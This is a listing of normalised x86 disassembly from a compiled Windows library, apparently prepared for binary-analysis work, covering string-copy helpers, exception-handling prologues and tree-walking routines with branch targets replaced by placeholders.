mov [ ebp - 0x148 ] bl
cmp [ ebp - 0x8c ] esi
jb r-xdata
mov edx [ ebp - 0x148 ]
push edx
call sub_10065045
add esp 0x4
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x90 ] ebx
mov [ ebp - 0xa0 ] bl
cmp [ ebp - 0xfc ] esi
jb r-xdata
mov eax [ ebp - 0xa0 ]
push eax
call sub_10065045
add esp 0x4
mov [ ebp - 0xfc ] edi
mov [ ebp - 0x100 ] ebx
mov [ ebp - 0x110 ] bl
cmp [ ebp - 0x118 ] esi
jb r-xdata
mov ecx [ ebp - 0x110 ]
push ecx
call sub_10065045
add esp 0x4
mov [ ebp - 0x118 ] edi
mov [ ebp - 0x11c ] ebx
mov [ ebp - 0x12c ] bl
cmp [ ebp - 0xc4 ] esi
jb r-xdata
mov edx [ ebp - 0x12c ]
push edx
call sub_10065045
add esp 0x4
mov eax [ ebp - 0x190 ]
mov [ ebp - 0xc4 ] edi
mov [ ebp - 0xc8 ] ebx
mov [ ebp - 0xd8 ] bl
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xd8 ]
push eax
call sub_10065045
add esp 0x4
mov [ ebp - 0x190 ] ebx
mov [ ebp - 0x18c ] ebx
mov [ ebp - 0x188 ] ebx
cmp [ ebp - 0x16c ] esi
jb r-xdata
mov ecx [ ebp - 0x1ac ]
push ecx
mov ecx [ ebp - 0x18c ]
lea edx [ ebp - 0x184 ]
push edx
push ecx
push eax
call sub_1000c130
mov edx [ ebp - 0x190 ]
push edx
call sub_10065045
add esp 0x14
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x16c ] edi
mov [ ebp - 0x170 ] ebx
mov [ ebp - 0x180 ] bl
cmp [ ebp - 0x70 ] esi
jb r-xdata
mov eax [ ebp - 0x180 ]
push eax
call sub_10065045
add esp 0x4
mov [ ebp - 0x70 ] edi
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x84 ] bl
mov ecx [ ebp - 0x84 ]
push ecx
call sub_10065045
add esp 0x4
sub_1006b7a0
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor eax eax
push edi
test esi esi
je r-xdata
pop edi
pop esi
mov eax 0x8007007a
mov [ ecx - 0x1 ] 0x0
pop ebx
pop ebp
retn 0x4
mov ebx [ ebp + 0x8 ]
mov edi edx
sub ebx ecx
test esi esi
jne r-xdata
mov dl [ ebx + ecx ]
test dl dl
je r-xdata
pop edi
pop esi
mov [ ecx ] al
pop ebx
pop ebp
retn 0x4
mov [ ecx ] dl
inc ecx
dec edi
dec esi
jne r-xdata
test edi edi
je r-xdata
pop edi
pop esi
mov eax 0x8007007a
mov [ ecx - 0x1 ] 0x0
pop ebx
pop ebp
retn 0x4
sub_1006b800
xor eax eax
test edx edx
je r-xdata
mov eax 0x80070057
cmp edx 0x7fffffff
jbe r-xdata
mov [ edi ] 0x0
retn
xor eax eax
push esi
mov esi edx
test edx edx
je r-xdata
test eax eax
js r-xdata
mov eax 0x80070057
cmp [ ecx ] ax
je r-xdata
pop esi
retn
test eax eax
js r-xdata
test esi esi
jne r-xdata
add ecx 0x2
dec esi
jne r-xdata
mov [ edi ] 0x0
sub edx esi
mov [ edi ] edx
pop esi
retn
test edi edi
je r-xdata
jmp r-xdata
sub_1006b860
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor eax eax
push edi
test esi esi
je r-xdata
sub ecx 0x2
mov eax 0x8007007a
mov ebx [ ebp + 0x8 ]
mov edi edx
sub ebx ecx
test esi esi
jne r-xdata
movzx edx [ ebx + ecx ]
test dx dx
je r-xdata
pop edi
xor edx edx
pop esi
mov [ ecx ] dx
pop ebx
pop ebp
retn 0x4
mov [ ecx ] dx
add ecx 0x2
dec edi
dec esi
jne r-xdata
test edi edi
je r-xdata
pop edi
sub ecx 0x2
xor edx edx
pop esi
mov eax 0x8007007a
mov [ ecx ] dx
pop ebx
pop ebp
retn 0x4
sub_1006b8d0
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
lea eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push 0x0
push ecx
push edx
push eax
call sub_100215f4
add esp 0x14
pop ebp
retn
sub_1006b8f0
mov ecx 0x9
xor eax eax
test ecx ecx
jne r-xdata
add edx 0x2
dec ecx
jne r-xdata
test esi esi
je r-xdata
mov eax 0x80070057
cmp [ edx ] ax
je r-xdata
jmp r-xdata
retn
test eax eax
js r-xdata
mov [ esi ] 0x0
mov edx 0x9
sub edx ecx
mov [ esi ] edx
retn
sub_1006b930
push ebp
mov ebp esp
push 0xffffffff
push sub_1007dd60
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x4c ] ebx
mov eax [ edi ]
cmp eax 0x2
jne r-xdata
cmp eax 0x1
jne r-xdata
mov edi [ edi + 0x10 ]
mov eax edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
lea edx [ eax + 0x1 ]
push ebx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
push r--data
mov eax [ edi + 0x1c ]
cmp eax 0x7
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push edi
jmp r-xdata
cmp eax 0x6
je r-xdata
mov ecx esi
call sub_1005d090
push r--data
lea ecx [ ebp - 0x2c ]
call sub_1003feb0
cmp [ edi + 0x14 ] 0x0
mov [ ebp - 0x4 ] ebx
jbe r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov ecx esi
mov [ esi ] 0x0
call sub_100172f0
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov eax [ edi + 0x10 ]
mov ecx [ eax + ebx * 4 ]
push ecx
lea edx [ ebp - 0x48 ]
push edx
call sub_1006b930
add esp 0x8
mov [ ebp - 0x4 ] 0x1
test ebx ebx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x2c ]
push edx
call sub_10065045
add esp 0x4
jmp r-xdata
push 0xffffffff
push 0x0
lea edx [ ebp - 0x48 ]
push edx
lea ecx [ ebp - 0x2c ]
call sub_10040f60
cmp [ ebp - 0x34 ] 0x10
mov [ ebp - 0x4 ] 0x0
jb r-xdata
cmp [ ebp - 0x38 ] 0x0
je r-xdata
inc ebx
cmp ebx [ edi + 0x14 ]
jb r-xdata
mov eax [ ebp - 0x48 ]
push eax
call sub_10065045
add esp 0x4
lea eax [ ebp - 0x4c ]
push eax
push 0x4
call sub_1002a3e0
lea eax [ ebp - 0x4c ]
add esp 0x8
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ ebp - 0x4c ]
push ecx
lea ecx [ ebp - 0x2c ]
call sub_1005be50
sub_1006bab0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007ddab
mov eax [ fs : 0x0 ]
push eax
sub esp 0x84
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
cmp [ edi ] 0x1
mov [ ebp - 0x90 ] edi
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
push 0xa
call sub_1002a3e0
add esp 0x8
xor ebx ebx
cmp [ edi + 0x1c ] 0x26
jne r-xdata
xor esi esi
cmp [ edi + 0x14 ] ebx
jbe r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
lea edx [ edi + 0x4c ]
push edx
call sub_1002e6f0
add esp 0x8
cmp eax ebx
je r-xdata
mov edx [ edi + 0x10 ]
mov eax [ edx + esi * 4 ]
push eax
call sub_1006bab0
inc esi
add esp 0x4
cmp esi [ edi + 0x14 ]
jb r-xdata
mov ecx [ eax + 0x10 ]
mov eax ecx
mov [ ebp - 0x40 ] 0xf
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] bl
lea esi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax esi
push eax
push ecx
lea ecx [ ebp - 0x54 ]
call sub_1005d090
mov eax [ ebp - 0x40 ]
mov edi [ ebp - 0x54 ]
mov [ ebp - 0x4 ] ebx
mov edx edi
cmp eax 0x10
jae r-xdata
mov ecx [ ebp - 0x44 ]
lea esi [ edx + ecx ]
mov edx edi
cmp eax 0x10
jae r-xdata
lea edx [ ebp - 0x54 ]
add ecx edx
cmp eax 0x10
mov eax edi
jae r-xdata
lea edx [ ebp - 0x54 ]
push sub_1004ba5c
push ecx
push eax
lea eax [ ebp - 0x1c ]
push eax
call sub_10036400
mov eax [ eax ]
add esp 0x10
push esi
push eax
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x54 ]
call sub_100367f0
lea edx [ ebp - 0x38 ]
push edx
push 0x3
call sub_1002a3e0
lea eax [ ebp - 0x38 ]
add esp 0x8
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x54 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
mov edi [ ebp - 0x44 ]
sub eax edx
mov esi eax
mov ecx edi
cmp edi esi
jb r-xdata
cmp [ ebp - 0x40 ] 0x10
mov eax [ ebp - 0x54 ]
jae r-xdata
mov ecx esi
push ecx
lea ecx [ ebp - 0x38 ]
push ecx
push eax
call sub_10068a30
add esp 0xc
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
sete al
cmp al bl
je r-xdata
cmp edi esi
jae r-xdata
cmp [ ebp - 0x40 ] 0x10
mov [ ebp - 0x4 ] 0xffffffff
jb r-xdata
mov edx [ ebp - 0x90 ]
mov eax [ edx + 0x10 ]
mov esi [ eax ]
lea ecx [ ebp - 0x18 ]
push ecx
push 0x2
call sub_1002a3e0
lea edx [ ebp - 0x18 ]
push edx
add esi 0x4c
push esi
call sub_1002e6f0
mov eax [ eax + 0x10 ]
add esp 0x10
push eax
lea ecx [ ebp - 0x70 ]
call sub_1003feb0
lea ecx [ ebp - 0x20 ]
push ecx
push 0xc
mov [ ebp - 0x4 ] 0x1
call sub_1002a3e0
lea eax [ ebp - 0x20 ]
add esp 0x8
lea ecx [ eax + 0x1 ]
jmp r-xdata
xor eax eax
cmp edi esi
setne al
or eax 0xffffffff
jmp r-xdata
mov edi [ ebp - 0x90 ]
mov [ ebp - 0x40 ] 0xf
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] bl
mov ecx [ ebp - 0x54 ]
push ecx
call sub_10065045
add esp 0x4
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
cmp eax ebx
sub eax ecx
push eax
push ebx
lea edx [ ebp - 0x20 ]
push edx
lea ecx [ ebp - 0x70 ]
call sub_1001a9f0
push 0xffffffff
add eax 0x7
push eax
lea eax [ ebp - 0x8c ]
push eax
lea ecx [ ebp - 0x70 ]
call sub_1003cd20
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x2
call sub_100172f0
lea ecx [ ebp - 0x8c ]
call sub_10021250
lea ecx [ ebp - 0x70 ]
call sub_10021250
sub_1006bd10
push ebp
mov ebp esp
push 0xffffffff
push sub_1007de0e
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0xb0 ] ebx
xor esi esi
cmp [ ebx ] 0x1
mov [ ebp - 0x4 ] esi
je r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
push 0xf
call sub_1002a3e0
mov edx [ ebx + 0x1c ]
add esp 0x8
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x24 ] 0x10
jb r-xdata
xor esi esi
cmp [ ebx + 0x14 ] esi
jbe r-xdata
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebx + 0x4c ]
push ecx
call sub_1002e6f0
add esp 0x8
cmp eax esi
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
push eax
jmp r-xdata
cmp [ ebp + 0x24 ] 0x10
jb r-xdata
lea eax [ ebp - 0x24 ]
push eax
push 0x13
call sub_1002a3e0
sub esp 0x14
mov ecx esp
lea eax [ ebp - 0x24 ]
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
mov [ ebp - 0x14 ] esp
mov [ ecx ] 0x0
lea edi [ eax + 0x1 ]
mov ecx [ eax + 0x10 ]
mov eax ecx
mov [ ebp - 0x44 ] esi
mov [ ebp - 0x40 ] 0xf
mov [ ebp - 0x54 ] 0x0
lea esi [ eax + 0x1 ]
lea esp [ esp ]
call sub_10065045
add esp 0x4
mov edx [ ebp + 0x10 ]
push edx
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
lea edx [ ebp - 0x24 ]
push edx
call sub_1005d090
mov eax [ ebx + 0x10 ]
mov ecx [ eax + esi * 4 ]
push 0x26
push ecx
call sub_1006bd10
inc esi
add esp 0x24
cmp esi [ ebx + 0x14 ]
jb r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
push eax
push ecx
lea ecx [ ebp - 0x54 ]
call sub_1005d090
mov eax [ ebp - 0x40 ]
mov edi [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x1
mov edx edi
cmp eax 0x10
jae r-xdata
mov ecx [ ebp - 0x44 ]
lea esi [ ecx + edx ]
mov edx edi
cmp eax 0x10
jae r-xdata
lea edx [ ebp - 0x54 ]
add ecx edx
cmp eax 0x10
mov eax edi
jae r-xdata
lea edx [ ebp - 0x54 ]
push sub_1004ba5c
push ecx
push eax
lea edx [ ebp - 0xb4 ]
push edx
call sub_10036400
mov eax [ eax ]
add esp 0x10
push esi
push eax
lea eax [ ebp - 0xb8 ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_100367f0
cmp [ ebp + 0x24 ] 0x10
mov edx [ ebp + 0x10 ]
jae r-xdata
lea eax [ ebp - 0x54 ]
mov esi [ ebp - 0x44 ]
mov edi [ ebp + 0x20 ]
mov ecx esi
cmp esi edi
jb r-xdata
lea edx [ ebp + 0x10 ]
cmp [ ebp - 0x40 ] 0x10
mov eax [ ebp - 0x54 ]
jae r-xdata
mov ecx edi
push ecx
push edx
push eax
call sub_10068a30
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x54 ]
sete al
test al al
je r-xdata
cmp esi edi
jae r-xdata
cmp [ ebp - 0x40 ] 0x10
mov [ ebp - 0x4 ] 0x0
jb r-xdata
lea ecx [ ebp - 0x38 ]
push ecx
push 0xe
call sub_1002a3e0
lea edx [ ebp - 0x38 ]
push edx
lea eax [ ebp - 0x54 ]
push eax
call sub_10025240
add esp 0x10
test al al
je r-xdata
xor eax eax
cmp esi edi
setne al
or eax 0xffffffff
jmp r-xdata
mov edx [ ebp - 0x54 ]
push edx
call sub_10065045
add esp 0x4
lea edx [ ebp - 0x24 ]
push edx
push 0x12
call sub_1002a3e0
lea eax [ ebp - 0x24 ]
add esp 0x8
lea edx [ eax + 0x1 ]
nop
xor esi esi
cmp [ ebx + 0x14 ] esi
jbe r-xdata
test eax eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov edi [ ebp - 0x44 ]
sub eax edx
mov esi eax
mov ecx edi
cmp edi esi
jb r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
push 0x10
call sub_1002a3e0
sub esp 0x14
mov ecx esp
lea eax [ ebp - 0x18 ]
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
mov [ ebp - 0xb4 ] esp
mov [ ecx ] 0x0
lea edi [ eax + 0x1 ]
cmp [ ebp - 0x40 ] 0x10
mov eax [ ebp - 0x54 ]
jae r-xdata
mov ecx esi
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax edi
push eax
lea edx [ ebp - 0x18 ]
push edx
call sub_1005d090
mov eax [ ebx + 0x10 ]
mov ecx [ eax + esi * 4 ]
push 0x26
push ecx
call sub_1006bd10
inc esi
add esp 0x24
cmp esi [ ebx + 0x14 ]
jb r-xdata
push ecx
lea ecx [ ebp - 0x24 ]
push ecx
push eax
call sub_10068a30
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x54 ]
sete al
test al al
je r-xdata
cmp edi esi
jae r-xdata
mov edx [ ebp - 0xb0 ]
push edx
lea eax [ ebp - 0x8c ]
push eax
call sub_1006b930
mov ecx [ ebp - 0x7c ]
mov eax 0x55555556
imul ecx
mov ebx edx
shr ebx 0x1f
add ebx edx
mov edi ecx
xor ecx ecx
mov eax ebx
mov edx 0x3
mul edx
seto cl
mov [ ebp - 0x4 ] 0x2
neg ecx
or ecx eax
push ecx
call sub_10062fc5
add esp 0xc
cmp [ ebp - 0x78 ] 0x10
mov esi eax
mov eax [ ebp - 0x8c ]
jae r-xdata
xor eax eax
cmp edi esi
setne al
or eax 0xffffffff
jmp r-xdata
push edi
push eax
push esi
call sub_10078600
xor ecx ecx
mov eax ebx
mov edx 0x4
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10062fc5
add esp 0x10
mov edi eax
test ebx ebx
jle r-xdata
lea eax [ ebp - 0x8c ]
test eax eax
xor esi esi
mov [ ebp - 0x5c ] 0xf
mov [ ebp - 0x60 ] esi
mov [ ebp - 0x70 ] 0x0
mov [ ebp - 0x4 ] 0x3
cmp ebx esi
jle r-xdata
mov eax esi
mov ecx edi
mov esi ebx
lea esp [ esp ]
cmp [ ebp - 0x78 ] 0x10
mov [ ebp - 0x5c ] 0xf
mov [ ebp - 0x60 ] 0x0
mov [ ebp - 0x70 ] 0x0
jb r-xdata
mov eax [ rw-data ]
cmp eax 0x3
ja r-xdata
mov dx [ eax ]
mov [ ecx ] dx
mov dl [ eax + 0x2 ]
mov [ ecx + 0x2 ] dl
add eax 0x3
add ecx 0x4
dec esi
jne r-xdata
mov ebx [ ebp - 0xb0 ]
mov ecx [ ebp - 0x8c ]
push ecx
call sub_10065045
add esp 0x4
inc esi
cmp esi ebx
jl r-xdata
jmp [ eax * 4 + jump_table_1006c348 ]
cmp [ ebp - 0x60 ] 0x0
jbe r-xdata
mov eax [ edi + esi * 4 ]
lea ecx [ ebp - 0xac ]
push ecx
lea edx [ ebp - 0xcc ]
and eax 0xffffff
push edx
mov ecx rw-data
mov [ ebp - 0xac ] eax
call sub_10062dc0
mov eax [ eax ]
cmp eax [ rw-data ]
je r-xdata
mov edx [ edi + esi * 4 ]
lea eax [ ebp - 0xac ]
push eax
lea ecx [ ebp - 0xc8 ]
and edx 0xffffff
push ecx
mov ecx rw-data
mov [ ebp - 0xac ] edx
call sub_10062dc0
mov eax [ eax ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ edi + esi * 4 ]
and ecx 0xffffff
lea edx [ ebp - 0xac ]
push edx
lea eax [ ebp - 0xc4 ]
mov [ ebp - 0xac ] ecx
push eax
mov ecx rw-data
call sub_10062dc0
mov eax [ eax ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ edi + esi * 4 ]
lea ecx [ ebp - 0xac ]
push ecx
lea edx [ ebp - 0x14 ]
and eax 0xffffff
push edx
mov ecx rw-data
mov [ ebp - 0xac ] eax
call sub_10062dc0
mov eax [ eax ]
cmp eax [ rw-data ]
je r-xdata
cmp [ ebp - 0x5c ] 0x10
jb r-xdata
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
mov al [ eax + 0x10 ]
mov [ ebp - 0xc0 ] al
mov ecx [ ebp - 0xc0 ]
jmp r-xdata
mov dl [ eax + 0x10 ]
mov [ ebp - 0xbc ] dl
mov eax [ ebp - 0xbc ]
push eax
jmp r-xdata
mov cl [ eax + 0x10 ]
mov [ ebp - 0xb8 ] cl
mov edx [ ebp - 0xb8 ]
push edx
jmp r-xdata
mov al [ eax + 0x10 ]
mov [ ebp - 0xb4 ] al
mov ecx [ ebp - 0xb4 ]
mov eax [ ebp - 0x70 ]
push eax
call sub_10065045
add esp 0x4
mov edx [ rw-data ]
push edx
push 0x0
push eax
lea ecx [ ebp - 0x70 ]
call sub_1001a9f0
cmp eax 0xffffffff
je r-xdata
mov eax rw-data
push ecx
push 0x1
lea ecx [ ebp - 0x70 ]
call sub_10050f80
mov eax [ rw-data ]
mov ebx 0x10
cmp [ rw-data ] ebx
jae r-xdata
mov ecx [ rw-data ]
push ecx
push 0x0
push eax
lea ecx [ ebp - 0x70 ]
call sub_1001a9f0
cmp eax 0xffffffff
je r-xdata
mov eax rw-data
mov eax [ rw-data ]
cmp [ rw-data ] ebx
jae r-xdata
mov edx [ rw-data ]
push edx
push 0x0
push eax
lea ecx [ ebp - 0x70 ]
call sub_1001a9f0
mov esi eax
mov eax [ rw-data ]
cmp [ rw-data ] ebx
jae r-xdata
mov eax rw-data
mov ecx [ rw-data ]
push ecx
push 0x0
push eax
lea ecx [ ebp - 0x70 ]
call sub_1001a9f0
mov edi eax
mov eax [ rw-data ]
cmp [ rw-data ] ebx
jae r-xdata
mov eax rw-data
mov edx [ rw-data ]
push edx
push 0x0
push eax
lea ecx [ ebp - 0x70 ]
call sub_1001a9f0
sub esi edi
sub esi 0x5
push esi
add eax 0x5
push eax
lea eax [ ebp - 0xa8 ]
push eax
lea ecx [ ebp - 0x70 ]
call sub_1003cd20
lea ecx [ ebp - 0xa8 ]
push ecx
mov ecx rw-data
mov [ ebp - 0x4 ] 0x4
call sub_10003820
cmp [ ebp - 0x94 ] ebx
jb r-xdata
mov eax rw-data
mov edx [ ebp - 0xa8 ]
push edx
call sub_10065045
add esp 0x4
sub_1006c3a0
push ebp
mov ebp esp
push eax
push ecx
call sub_1002e6f0
add esp 0x8
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
mov edx [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
push edx
push eax
call sub_10028b2b
add esp 0x8
neg eax
sbb eax eax
inc eax
pop ebp
retn
sub_1006c3d0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
push esi
push edi
xor edi edi
mov [ ebp - 0x4 ] ecx
cmp [ ebx + 0x4 ] edi
jbe r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
pop edi
sete al
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebx ]
mov eax [ edx + edi * 4 ]
mov esi [ eax + 0x10 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_1002e6f0
add esp 0x8
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ eax + 0x10 ]
mov eax esi
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
dec [ ebp - 0x4 ]
inc edi
cmp edi [ ebx + 0x4 ]
jb r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_1006c470
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x14
push ebx
call sub_10024af0
push 0x58
xor edi edi
push ebx
mov [ ebp - 0x4 ] eax
mov [ eax + 0x4 ] edi
call sub_10024af0
mov esi eax
mov [ esi + 0x4 ] edi
mov [ esi ] edi
lea edi [ esi + 0x10 ]
push edi
push 0x1
push ebx
mov [ esi + 0x8 ] 0xffffffff
mov [ esi + 0xc ] 0x1
call sub_10004e00
xor eax eax
mov [ edi + 0xc ] eax
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax ] esi
push ebx
mov [ ebx + 0x4 ] eax
call sub_1000dc20
add esp 0x20
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_1006c4e0
push ebx
push esi
push 0x74
push edi
call sub_10024af0
mov esi eax
lea eax [ esi + 0x48 ]
xor ebx ebx
push eax
push edi
mov [ esi ] ebx
mov [ esi + 0x34 ] ebx
mov [ esi + 0x3c ] 0x1
mov [ esi + 0x40 ] ebx
mov [ esi + 0x44 ] ebx
mov [ esi + 0x64 ] 0x5
call sub_1001c570
lea ecx [ esi + 0x8 ]
push ecx
push 0xa
push edi
call sub_10004e00
lea edx [ esi + 0x14 ]
push edx
push 0x5
push edi
call sub_10004e00
lea eax [ esi + 0x20 ]
push eax
push 0x5
push edi
call sub_10004e00
mov [ esi + 0x2c ] ebx
mov [ esi + 0x30 ] ebx
mov [ esi + 0x68 ] ebx
mov [ esi + 0x6c ] ebx
mov [ esi + 0x70 ] ebx
add esp 0x34
mov [ edi + 0xc ] esi
pop esi
pop ebx
retn
sub_1006c570
cmp [ eax + 0x4 ] 0x0
push esi
jbe r-xdata
xor eax eax
pop esi
retn
mov esi eax
lea esp [ esp ]
mov eax [ esi ]
push eax
push edi
call sub_10028b2b
add esp 0x8
mov ecx [ esi ]
mov eax edi
mov eax 0x1
pop esi
retn
add esi 0x8
cmp [ esi + 0x4 ] 0x0
ja r-xdata
sbb eax eax
sbb eax 0xffffffff
jmp r-xdata
test dl dl
je r-xdata
test ebx ebx
je r-xdata
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_1006c5e0
push edi
mov edi [ eax + 0xc ]
mov ecx [ edi + 0xc ]
dec ecx
js r-xdata
pop edi
retn
mov edx [ edi + 0x8 ]
push esi
lea esi [ edx + ecx * 4 ]
neg eax
sbb eax eax
and eax 0x6
movzx edx [ edx + lookup_table_1006c6c4 ]
jmp [ edx * 4 + jump_table_1006c698 ]
mov [ edi ] eax
pop esi
sub esi 0x4
dec ecx
jns r-xdata
xor edx edx
test eax eax
sete dl
lea eax [ edx * 8 + 0x6 ]
jmp r-xdata
mov eax 0xf
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0xd
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0xc
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0xa
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0xb
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0x8
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0x6
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0x13
pop esi
mov [ edi ] eax
pop edi
retn
mov eax 0x2
mov edx [ esi ]
mov edx [ edx + 0x1c ]
xor eax eax
test ecx ecx
sete al
cmp edx 0x81
ja r-xdata
pop esi
pop edi
retn
test eax eax
jne r-xdata
sub_1006c6cf
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
add al [ ebx ]
add al 0xa
add eax 0x7060505
pop es
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or [ edx ] cl
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or cl [ edx ]
or esp ecx
int3
sub_1006c750
push ebp
mov ebp esp
push ebx
push esi
push edi
push r--data
mov edi eax
call sub_1001f980
mov ebx [ ebp + 0x8 ]
push ebx
call sub_10043670
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
mov [ esi ] 0x28
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
mov ecx [ edi + 0x8 ]
mov [ esi + 0x8 ] ecx
mov edx [ edi + 0xc ]
mov [ esi + 0xc ] edx
mov eax [ edi + 0x10 ]
mov [ esi + 0x10 ] eax
mov ecx [ edi ]
mov [ esi + 0x18 ] ecx
mov [ esi + 0x1c ] 0x95
mov eax [ edi ]
cmp eax 0x1
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
